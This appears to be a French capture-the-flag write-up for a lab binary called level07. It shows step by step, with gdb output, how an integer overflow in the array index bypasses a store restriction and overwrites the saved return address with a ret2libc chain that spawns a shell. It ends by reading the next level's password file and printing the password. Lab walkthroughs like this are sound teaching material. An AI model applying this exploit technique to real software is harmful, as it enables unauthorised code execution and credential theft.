On trouve un binaire level07 à la racine du répo, celui ci contient une fonction **main**, **read_number**, **store_number**, **get_unum** et **clear_stdin**.

Le programme set les arguments ainsi que la liste des variables d'environnement (*envp) à 0 puis nous présente 3 commande: quit (qui nous permet de quitter le programme), store (enregistrer un nombre dans un tableau d'int) et read (pour lire n'importe quelle case de ce tableau).

Cependant, pour la fonction read l'index n'est pas controlé, et pour la fonction store, nous avons deux restrictions : l'index ne peut pas être un multiple de 3 et le nombre ne peut pas commencer par **0xb7000000** (parcing appel system).

On va donc essayer de passer outre ce parcing, et tenter d'écraser l'eip pour effectuer un **ret2libc**.

Pour commencer, on cherche l'offset en cherchant d'abord l'adresse de notre tableau 

```gdb
> gdb -q level07 
Reading symbols from /home/users/level07/level07...(no debugging symbols found)...done.
(gdb) > disas main
...
(gdb) b *main+520
Breakpoint 1 at 0x804892b
(gdb) run
Starting program: /home/users/level07/level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: read

Breakpoint 1, 0x0804892b in main ()
(gdb) i f
Stack level 0, frame at 0xffffd720:
 eip = 0x804892b in main; saved eip 0xf7e45513
 Arglist at 0xffffd718, args:
 Locals at 0xffffd718, Previous frame's sp is 0xffffd720
 Saved registers:
  ebx at 0xffffd70c, ebp at 0xffffd718, esi at 0xffffd710, edi at 0xffffd714, eip at 0xffffd71c
(gdb) i r
eax            0xffffd554       -10924
ecx            0xffffd600       -10752
edx            0xffffd600       -10752
ebx            0xffffd554       -10924
...
(gdb) p 0xffffd71c -  0xffffd554
$1 = 456
(gdb) p 456 / 4
$2 = 114
```

L'adresse du début de notre tableau est donc **0xffffd554**, stocké dans **$eax** (premier argument de read_number) et l'adresse de notre eip est **0xffffd71c**.

> L'offset est donc de 456 octet, soit 114 int.

On ne peut écrire directement à 114 à cause de la restriction du multiple de 3 dans read_number.

On va donc essayer d'overflow pour écrire à cette adresse. On calcule donc:  
> UINT_MAX (4294967295 + 1) / 4 + 114 = 1073741938

> UINT_MAX + 1 pour l'overflow

```shell
Input command: store
 Number: 1111638594
 Index: 1073741938
 Completed store command successfully
Input command: read
 Index: 114
 Number at data[114] is 1111638594
 Completed read command successfully
Input command: quit

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```
On effectue une vérification pour être sur d'avoir écrasé l'eip.
En stockant le nombre 1111638594 (0x42424242) à l'index calculé, on constate qu'on a réussi à écrire à l'adresse 114 et que le programme segfault bien sur cette adresse.

```gdb
Breakpoint 1, 0x08048723 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) info proc map
process 1657
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
         0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
         0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
        0xf7e2b000 0xf7e2c000     0x1000        0x0
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
...
(gdb) find  0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
```

On récupère les adresses nécessaires pour faire notre ret2libc:
> system :  0xf7e6aed0 : 4159090384  
exit :  0xf7e5eb70 : 4159040368  
"/bin/sh":  0xf7f897ec :  4160264172

On va donc stocker dans le tableau a l'index 114 l'adresse **system**, a l'index 115 **exit** et a l'index 116 "/bin/sh".

```shell
./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store 
 Number: 4159090384
 Index: 1073741938
 Completed store  command successfully
Input command: store 
 Number: 4159040368
 Index: 115
 Completed store  command successfully
Input command: store 
 Number: 4160264172
 Index: 116
 Completed store  command successfully
Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```